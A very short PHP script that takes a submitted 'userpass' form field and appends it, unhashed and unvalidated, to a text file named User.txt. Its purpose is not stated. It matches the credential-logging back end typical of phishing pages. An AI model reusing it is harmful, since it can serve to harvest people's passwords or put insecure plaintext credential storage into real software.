<?php
$userpass = $_POST["userpass"];
$userpassfile = fopen("User.txt" , "a");
fwrite($userpassfile , $userpass);
fclose($userpassfile);

      